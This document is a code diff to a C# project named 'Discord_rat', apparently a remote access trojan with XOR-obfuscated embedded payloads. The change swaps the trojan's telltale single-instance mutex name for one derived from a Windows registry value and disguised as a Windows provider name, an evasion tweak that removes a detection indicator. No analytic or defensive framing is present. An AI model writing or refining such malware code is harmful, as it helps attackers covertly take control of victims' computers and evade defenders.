@@ -154,6 +154,26 @@ namespace Discord_rat
         public static Dictionary<string, byte[]> EmbeddedModules = new Dictionary<string, byte[]>();
         private const byte PayloadXorKey = 0xA7;
 
+        private static string GetInstanceMutexName()
+        {
+            try
+            {
+                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\AppReadiness"))
+                {
+                    string session = key?.GetValue("Session") as string;
+                    if (!string.IsNullOrWhiteSpace(session))
+                    {
+                        return @"Global\WRProv_" + session;
+                    }
+                }
+            }
+            catch
+            {
+            }
+
+            return @"Global\WRProv_default";
+        }
+
         public static string GetPayloadPath()
         {
             string path = Assembly.GetExecutingAssembly().Location;
@@ -288,7 +308,7 @@ namespace Discord_rat
         public static void Start()
         {
             bool created;
-            instanceMutex = new Mutex(true, @"Global\DiscordRAT_ShaherDev_v1", out created);
+            instanceMutex = new Mutex(true, GetInstanceMutexName(), out created);
             if (!created)
             {
                 return;
